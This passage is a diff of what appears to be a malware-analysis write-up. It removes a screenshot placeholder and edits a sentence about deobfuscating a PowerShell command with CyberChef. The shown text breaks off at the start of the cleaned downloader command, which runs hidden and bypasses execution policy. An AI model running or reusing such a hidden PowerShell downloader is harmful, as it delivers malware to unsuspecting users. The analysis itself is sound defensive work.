@@ -69,9 +69,7 @@ To make the PowerShell command human-readable, we used **CyberChef**:
   - Replace `*` with an empty string
   - Replace `^` with an empty string
 
-> 🔽 **Insert screenshot of CyberChef here showing the Find/Replace steps and the cleaned PowerShell script**
-
-Once cleaned, the PowerShell command was clearly a downloader:
+Once cleand, the PowerShell command was clearly a downloader:
 
 ```powershell
 powershell -WindowStyle hidden -executionpolicy bypass;
